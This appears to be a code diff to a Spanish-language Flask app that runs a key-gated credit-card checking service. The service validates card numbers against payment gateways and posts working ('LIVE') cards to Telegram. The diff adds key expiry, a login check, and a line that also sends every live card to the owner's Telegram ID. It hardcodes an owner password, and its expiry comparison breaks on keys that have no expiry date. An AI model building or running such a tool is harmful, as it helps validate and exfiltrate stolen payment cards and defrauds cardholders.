@@ -1,5 +1,6 @@
 import os
 import asyncio
+from datetime import datetime, timedelta
 from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for, render_template, flash
 from flask_cors import CORS
 from flask_sqlalchemy import SQLAlchemy
@@ -15,11 +16,12 @@ app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
+# MODELOS
 class User(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(50), unique=True, nullable=False)
     password_hash = db.Column(db.String(128), nullable=False)
-    key = db.Column(db.String(50), unique=True, nullable=False)
+    key = db.Column(db.String(50), db.ForeignKey('key.key'), nullable=True)
     telegram_id = db.Column(db.String(20), nullable=True)
     role = db.Column(db.String(10), default='user')
 
@@ -32,17 +34,21 @@ class Key(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     key = db.Column(db.String(50), unique=True, nullable=False)
     used = db.Column(db.Boolean, default=False)
+    expires_at = db.Column(db.DateTime, nullable=True)
 
 with app.app_context():
     db.create_all()
     owner = User.query.filter_by(username='owner').first()
     if not owner:
+        owner_key = Key(key='owner_key', used=True)
+        db.session.add(owner_key)
+        db.session.commit()
         owner = User(username='owner', key='owner_key', role='owner', telegram_id='846983753')
         owner.set_password('Saiper123')
         db.session.add(owner)
         db.session.commit()
 
-
+# RUTAS
 @app.route('/')
 def index():
     if 'user_id' in session:
@@ -65,8 +71,8 @@ def register():
             return redirect(url_for('register'))
 
         key_obj = Key.query.filter_by(key=key_input, used=False).first()
-        if not key_obj:
-            flash('La key no es válida o ya fue usada.', 'error')
+        if not key_obj or key_obj.expires_at < datetime.utcnow():
+            flash('La key no es válida, ya fue usada o expiró.', 'error')
             return redirect(url_for('register'))
 
         if User.query.filter_by(username=username).first():
@@ -130,11 +136,13 @@ def generate_key():
     if user.role not in ['owner', 'admin']:
         return jsonify({'status': 'error', 'message': 'No tienes permisos para generar keys.'}), 403
 
-    new_key = os.urandom(6).hex()
-    key = Key(key=new_key)
-    db.session.add(key)
+    duration_days = int(request.json.get('duration_days', 1))
+    new_key_str = os.urandom(6).hex()
+    expires_at = datetime.utcnow() + timedelta(days=duration_days)
+    new_key = Key(key=new_key_str, expires_at=expires_at)
+    db.session.add(new_key)
     db.session.commit()
-    return jsonify({'status': 'success', 'key': new_key})
+    return jsonify({'status': 'success', 'key': new_key_str, 'expires_at': expires_at.isoformat()})
 
 @app.route('/add_admin', methods=['POST'])
 def add_admin():
@@ -169,6 +177,15 @@ def enviar_telegram(mensaje, ids=[]):
 
 @app.route('/check', methods=['POST'])
 def check_card():
+    if 'user_id' not in session:
+        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
+
+    user = User.query.get(session['user_id'])
+    key_obj = Key.query.filter_by(key=user.key).first()
+
+    if not key_obj or key_obj.expires_at < datetime.utcnow():
+        return jsonify({'status': 'error', 'message': 'No tienes una key activa o tu key ha expirado.'}), 403
+
     data = request.get_json()
     cc = data.get('cc')
     gateway = data.get('gateway', 'TEC')
@@ -187,7 +204,7 @@ def check_card():
             result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}
 
         if result['status'] == 'live':
-            user = User.query.get(session['user_id'])
+            enviar_telegram(f"✅ *LIVE* - {result['cc']}\n{result['message']}", OWNER_TELEGRAM_ID)
             telegram_ids = [user.telegram_id] if user.telegram_id else []
             enviar_telegram(f"✅ *LIVE* - {result['cc']}\n{result['message']}", telegram_ids)
 
@@ -202,4 +219,3 @@ def ping():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
-
